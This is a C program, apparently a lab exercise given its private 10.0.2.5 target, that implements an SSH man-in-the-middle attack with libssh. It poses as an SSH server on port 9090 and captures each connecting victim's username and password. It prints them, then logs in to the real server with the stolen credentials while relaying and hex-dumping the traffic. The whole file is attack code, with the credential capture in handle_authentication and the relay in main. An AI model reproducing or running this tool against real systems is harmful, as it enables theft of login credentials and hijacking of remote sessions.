// to compile: gcc ssh_attack.c -lssh -lpthread -g

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>  // Required for fcntl and the flags
#include <arpa/inet.h>
#include <sys/socket.h>
#include <libssh/libssh.h>
#include <libssh/server.h>
#include <libssh/ssh2.h>
#include <pthread.h>

#define PORT 9090
#define BUFFER_SIZE 4096

ssh_session victim_session;
ssh_session real_server_session;
// Structure to store captured credentials
typedef struct {
    char username[256];
    char password[256];
} Credentials;

int handle_authentication(Credentials *creds) {
    int fd = ssh_get_fd(victim_session);  // Get the file descriptor for the session
    fd_set read_fds;
    ssh_message message;
    struct timeval timeout;

    // Set the SSH session to non-blocking mode
    ssh_set_blocking(victim_session, 0);

    while (1) {
        // Set up the file descriptor set for select()
        FD_ZERO(&read_fds);
        FD_SET(fd, &read_fds);

        // Set the timeout value for select (e.g., 10 seconds)
        timeout.tv_sec = 10;
        timeout.tv_usec = 0;

        // Wait for data to be available on the socket
        int result = select(fd + 1, &read_fds, NULL, NULL, &timeout);

        if (result < 0) {
            perror("select");
            return -1;  // Error occurred
        } else if (result == 0) {
            printf("Timeout occurred, no data received.\n");
            continue;  // Timeout, try again
        }

        // Process any pending messages (non-blocking, using ssh_execute_message_callbacks())
        if (FD_ISSET(fd, &read_fds)) {
            // ssh_execute_message_callbacks(session);  // Process pending messages

            // Try to retrieve a new SSH message
            while ((message = ssh_message_get(victim_session)) != NULL) {
                if (ssh_message_type(message) == SSH_REQUEST_AUTH
                   && ssh_message_subtype(message) == SSH_AUTH_METHOD_PASSWORD) {
                     strcpy(creds->username, ssh_message_auth_user(message));
                     strcpy(creds->password, ssh_message_auth_password(message));
                     printf("Captured credentials - Username: %s, Password: %s\n", creds->username, creds->password);
		     // ssh_message_auth_reply_success(message, 0);
                     // ssh_message_free(message);  // Free the message
		     return 0;
                } else {
                    ssh_message_reply_default(message);  // Reply with default action
                }
                ssh_message_free(message);  // Free the message
            }

            // Check if there are any errors
            const char *error_msg = ssh_get_error(victim_session);
            if (error_msg != NULL && strlen(error_msg) > 0) {
                fprintf(stderr, "SSH session error: %s\n", error_msg);
                return -1;  // Exit on fatal error
            }
        }
    }
    return 0;
}

// Function to forward traffic between victim and real server
void* forward_traffic(void* args) {
    int server_fd = ((int*)args)[0];
    int victim_fd = ((int*)args)[1];
    char buffer[BUFFER_SIZE];
    int bytes_read;

    while (1) {
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(victim_fd, &read_fds);
        FD_SET(server_fd, &read_fds);

        int max_fd = (victim_fd > server_fd) ? victim_fd : server_fd;

        if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) {
            perror("select failed");
            break;
        }

        if (FD_ISSET(victim_fd, &read_fds)) {
            bytes_read = read(victim_fd, buffer, sizeof(buffer));
            if (bytes_read < 0) {
                perror("Error reading from victim");
            } else if (bytes_read == 0) {
                printf("Connection closed by victim\n");
            }
            printf("Forwarding %d bytes from client to server\n", bytes_read);
	    // Debug print (optional)
            for (int i = 0; i < bytes_read; i++) {
                printf("%02x ", (unsigned char)buffer[i]);
            }
            printf("\n");
            ssize_t bytes_written = write(server_fd, buffer, bytes_read);
            if (bytes_written < 0) {
                perror("Error writing to server");
            }
        }

        if (FD_ISSET(server_fd, &read_fds)) {
            bytes_read = read(server_fd, buffer, sizeof(buffer));
            if (bytes_read < 0) {
                perror("Error reading from server");
            } else if (bytes_read == 0) {
                printf("Connection closed by server\n");
            }
            printf("Forwarding %d bytes from server to client\n", bytes_read);
	    // Debug print (optional)
            for (int i = 0; i < bytes_read; i++) {
                printf("%02x ", (unsigned char)buffer[i]);
            }
            printf("\n");
            ssize_t bytes_written = write(victim_fd, buffer, bytes_read);
            if (bytes_written < 0) {
                perror("Error writing to victim");
            }
        }
	// clear the buffer for the next read operation
        memset(buffer, 0, BUFFER_SIZE);
    }
}

// Main function to set up the MITM server
int main() {
    ssh_bind sshbind;
    int victim_fd, server_fd;
    struct sockaddr_in addr;
    Credentials creds;

    sshbind = ssh_bind_new();
    if (sshbind == NULL) {
        fprintf(stderr, "Error creating SSH bind object.\n");
        exit(EXIT_FAILURE);
    }

    // Set the private RSA key file path
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_HOSTKEY, "ssh_host_rsa_key");

    // Set log level here
    ssh_set_log_level(SSH_LOG_PROTOCOL);  // Enable protocol-level logging

    int port = PORT;
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDADDR, "0.0.0.0");
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT, &port);

    if (ssh_bind_listen(sshbind) != SSH_OK) {
        fprintf(stderr, "Error listening on port %d: %s\n", PORT, ssh_get_error(sshbind));
        ssh_bind_free(sshbind);
        exit(EXIT_FAILURE);
    }

    while (1) {
        victim_session = ssh_new();
        if (victim_session == NULL) {
            fprintf(stderr, "Error creating SSH session.\n");
            continue;
        }

	// Accept an SSH connection
        if (ssh_bind_accept(sshbind, victim_session) != SSH_OK) {
            fprintf(stderr, "Error accepting connection: %s\n", ssh_get_error(sshbind));
            return EXIT_FAILURE;
        }

        // Retrieve the file descriptor for the accepted session
        victim_fd = ssh_get_fd(victim_session);
        if (victim_fd < 0) {
            fprintf(stderr, "Error retrieving file descriptor: %s\n", ssh_get_error(victim_session));
            ssh_free(victim_session);
            return EXIT_FAILURE;
        }

        // Now you can use victim_fd for further operations
        printf("Victim file descriptor: %d\n", victim_fd);

        // Start the SSH handshake (this is critical before handling authentication)
        if (ssh_handle_key_exchange(victim_session) != SSH_OK) {
            fprintf(stderr, "Error in key exchange: %s\n", ssh_get_error(victim_session));
            ssh_free(victim_session);
            continue;
        }

        // Handle authentication and capture credentials
        if (handle_authentication(&creds) != 0) {
            fprintf(stderr, "Failed to capture credentials.\n");
            close(victim_fd);
            ssh_free(victim_session);
            continue;
        }

        // Connect to the real SSH server
        int real_server_fd = socket(AF_INET, SOCK_STREAM, 0);
        if (real_server_fd < 0) {
            perror("socket");
            close(victim_fd);
            ssh_free(victim_session);
            continue;
        }

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(22);
        addr.sin_addr.s_addr = inet_addr("10.0.2.5"); // Replace with real server IP

        if (connect(real_server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            perror("connect");
            close(real_server_fd);
            close(victim_fd);
            ssh_free(victim_session);
            continue;
        }

        // Handle SSH connection with the real server
        real_server_session = ssh_new();
        if (real_server_session == NULL) {
            fprintf(stderr, "Error creating real server SSH session.\n");
            close(real_server_fd);
            close(victim_fd);
            ssh_free(victim_session);
            continue;
        }

	int verbosity_level = 3;
	ssh_options_set(real_server_session, SSH_OPTIONS_HOST, "10.0.2.5");
        ssh_options_set(real_server_session, SSH_OPTIONS_FD, &real_server_fd);
	ssh_options_set(real_server_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity_level);
        ssh_set_blocking(real_server_session, 1);

        ssh_options_set(victim_session, SSH_OPTIONS_FD, &victim_fd);
	ssh_options_set(victim_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity_level);
        ssh_set_blocking(victim_session, 1);

        // Perform the SSH handshake
        if (ssh_connect(real_server_session) != SSH_OK) {
            fprintf(stderr, "Error connecting to real server: %s\n", ssh_get_error(real_server_session));
            ssh_free(real_server_session);
            close(real_server_fd);
            close(victim_fd);
            ssh_free(victim_session);
            continue;
        }

	// Prepare arguments for the forwarding thread
        int fds[2] = {real_server_fd, victim_fd};

        // Create a single thread to forward data
        pthread_t forward_thread;
        pthread_create(&forward_thread, NULL, forward_traffic, (void*)fds);

	// Parent waits for a short period of time (e.g., 5 second)
        sleep(5); // Wait for 5 second;
        // Attempt to authenticate with captured credentials
        if (ssh_userauth_password(real_server_session, creds.username, creds.password) != SSH_AUTH_SUCCESS) {
            fprintf(stderr, "Failed to authenticate with real server using %s and %s: %s\n", creds.username, creds.password, ssh_get_error(real_server_session));
            ssh_free(real_server_session);
            close(real_server_fd);
            ssh_free(victim_session);
            close(victim_fd);
            continue;
        }

        // Wait for the forwarding thread to finish
        pthread_join(forward_thread, NULL);

        // Clean up
	// Close the channel when done
        ssh_free(real_server_session);
        close(real_server_fd);
        ssh_free(victim_session);
        close(victim_fd);
    }

    ssh_bind_free(sshbind);
    return 0;
}

